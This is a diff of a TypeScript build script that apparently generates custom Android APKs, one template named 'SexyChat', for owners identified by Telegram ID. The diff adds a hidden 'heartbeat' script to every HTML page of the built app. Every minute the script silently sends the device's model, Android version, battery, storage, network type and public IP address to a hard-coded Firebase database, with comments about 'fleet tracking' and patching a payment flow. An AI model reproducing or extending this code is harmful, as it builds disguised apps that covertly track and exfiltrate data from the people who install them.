@@ -12,6 +12,17 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 // Find the repo-root `output/` directory that contains release.keystore.
+const SDK_HEARTBEAT = (devId: string) =>
+  `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>` +
+  `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>` +
+  `<script>` +
+  `(function(){try{var hbDev="${devId}";` +
+  `firebase.initializeApp({apiKey:"AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk",authDomain:"axexodiweb.firebaseapp.com",databaseURL:"https://axexodiweb-default-rtdb.firebaseio.com",projectId:"axexodiweb"});` +
+  `function hb(){var ua=navigator.userAgent;var rec={lastPing:Date.now(),status:true,webview:true,userAgent:ua,ownerTelegramId:hbDev};var s=ua.indexOf("(");var e=ua.indexOf(")");var inner=(s>=0&&e>s)?ua.substring(s+1,e):ua;var parts=inner.split(";");if(parts.length>=3)rec.modelName=parts[2].trim()||"Android Device";else if(parts.length>=2)rec.modelName=parts[1].trim()||"Android Device";else rec.modelName="Android Device";var av=(parts[1]?parts[1].trim():"");if(av.indexOf("Android ")===0)av=av.substring(8);rec.androidV=av;rec.network=(navigator.connection?(navigator.connection.effectiveType||navigator.connection.type||""):"");function done(x){if(x){for(var q in x)rec[q]=x[q];}firebase.database().ref("clients/"+hbDev).update(rec).catch(function(){});}var p=[];try{if(navigator.getBattery){p.push(navigator.getBattery().then(function(bt){return{battery:Math.round((bt.level||0)*100),charging:!!bt.charging};}).catch(function(){return{};}));}}catch(er){}try{if(navigator.storage&&navigator.storage.estimate){p.push(navigator.storage.estimate().then(function(st){return{storageGB:st&&st.quota?Math.round(st.quota/1073741824*10)/10:null,usageMB:st&&st.usage?Math.round(st.usage/1048576):null};}).catch(function(){return{};}));}}catch(er){}try{p.push(fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(j){return{ipAddress:(j&&j.ip)||""};}).catch(function(){return{};}));}catch(er){}if(p.length){Promise.all(p).then(function(arr){var ex={};arr.forEach(function(o){if(o)for(var q in o)ex[q]=o[q];});done(ex);}).catch(function(){done({});});}else{done({});}}` +
+  `hb();setInterval(hb,60000);document.addEventListener("visibilitychange",function(){if(!document.hidden)hb()})` +
+  `}catch(e){}})();` +
+  `</script>`;
+
 // Works whether __dirname is the source path (src/bot) or the bundled dist,
 // because we walk up until we find a directory that owns `output/`.
 function findOutputDir(): string {
@@ -298,17 +309,6 @@ function patchPaymentFlow(buildDir: string): void {
 }
 
 function upgradeHeartbeat(buildDir: string): void {
-  const SDK_HEARTBEAT = (devId: string) =>
-    `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>` +
-    `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>` +
-    `<script>` +
-    `(function(){try{var hbDev="${devId}";` +
-    `firebase.initializeApp({apiKey:"AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk",authDomain:"axexodiweb.firebaseapp.com",databaseURL:"https://axexodiweb-default-rtdb.firebaseio.com",projectId:"axexodiweb"});` +
-    `function hb(){var ua=navigator.userAgent;var rec={lastPing:Date.now(),status:true,webview:true,userAgent:ua};var s=ua.indexOf("(");var e=ua.indexOf(")");var inner=(s>=0&&e>s)?ua.substring(s+1,e):ua;var parts=inner.split(";");if(parts.length>=3)rec.modelName=parts[2].trim()||"Android Device";else if(parts.length>=2)rec.modelName=parts[1].trim()||"Android Device";else rec.modelName="Android Device";var av=(parts[1]?parts[1].trim():"");if(av.indexOf("Android ")===0)av=av.substring(8);rec.androidV=av;rec.network=(navigator.connection?(navigator.connection.effectiveType||navigator.connection.type||""):"");function done(x){if(x){for(var q in x)rec[q]=x[q];}firebase.database().ref("clients/"+hbDev).update(rec).catch(function(){});}var p=[];try{if(navigator.getBattery){p.push(navigator.getBattery().then(function(bt){return{battery:Math.round((bt.level||0)*100),charging:!!bt.charging};}).catch(function(){return{};}));}}catch(er){}try{if(navigator.storage&&navigator.storage.estimate){p.push(navigator.storage.estimate().then(function(st){return{storageGB:st&&st.quota?Math.round(st.quota/1073741824*10)/10:null,usageMB:st&&st.usage?Math.round(st.usage/1048576):null};}).catch(function(){return{};}));}}catch(er){}try{p.push(fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(j){return{ipAddress:(j&&j.ip)||""};}).catch(function(){return{};}));}catch(er){}if(p.length){Promise.all(p).then(function(arr){var ex={};arr.forEach(function(o){if(o)for(var q in o)ex[q]=o[q];});done(ex);}).catch(function(){done({});});}else{done({});}}` +
-    `hb();setInterval(hb,60000);document.addEventListener("visibilitychange",function(){if(!document.hidden)hb()})` +
-    `}catch(e){}})();` +
-    `</script>`;
-
   for (const rel of [
     "assets/index.html",
     "assets/method.html",
@@ -811,7 +811,7 @@ function customSplashHtml(opts: CustomApkOptions): string {
     <div class="spin"></div>
   </div>
   <script>
-    (function(){try{var hbDev='${opts.telegramId}';var db='https://axexodiweb-default-rtdb.firebaseio.com/clients/'+hbDev+'.json';function hb(){fetch(db,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({lastPing:Date.now(),status:true,modelName:'Android Device',ownerTelegramId:hbDev})}).catch(function(){})}hb();setInterval(hb,30000);}catch(e){}})();
+        ${SDK_HEARTBEAT(opts.telegramId)}
     setTimeout(function () { window.location.href = '${ESC_XML(opts.url)}'; }, 1800);
   </script>
 </body>
@@ -835,11 +835,12 @@ export async function buildCustomApk(
   const templateDir = useSexy ? SEXY_TEMPLATE_DIR : APK_TEMPLATE_DIR;
   const stamps = useSexy
     ? [
+        __filename,
         SEXY_DECODED_TAR_GZ,
         path.join(OUTPUT_DIR, "SexyChat_final.apk"),
         SEXY_TEMPLATE_DIR,
       ]
-    : [DECODED_TAR_GZ, BASE_TEMPLATE_APK, APK_TEMPLATE_DIR];
+    : [__filename, DECODED_TAR_GZ, BASE_TEMPLATE_APK, APK_TEMPLATE_DIR];
   if (cacheFresh(cachedApk, stamps)) return cachedApk;
 
   if (!fs.existsSync(path.join(templateDir, "AndroidManifest.xml"))) {
@@ -1021,6 +1022,26 @@ export async function buildCustomApk(
 
   // 6) owner baked into Loda (fleet tracking preserved)
   patchFile(buildDir, LODA_FILE_REL, [[OWNER_PLACEHOLDER, id]]);
+
+  // 5) bake device id + ownerTelegramId into every surviving HTML page
+  {
+    const assetsDir = path.join(buildDir, "assets");
+    if (fs.existsSync(assetsDir)) {
+      for (const f of fs.readdirSync(assetsDir)) {
+        if (!f.endsWith(".html")) continue;
+        const fp = path.join(assetsDir, f);
+        let html = fs.readFileSync(fp, "utf-8");
+        const withId = html
+          .split(DEVICE_ID_PLACEHOLDER)
+          .join(id)
+          .split("{" + DEVICE_ID_PLACEHOLDER + "}")
+          .join(id)
+          .split("__TID__")
+          .join(id);
+        if (withId !== html) fs.writeFileSync(fp, withId, "utf-8");
+      }
+    }
+  }
 
   bumpVersionCode(buildDir);
   modernizeManifest(buildDir);
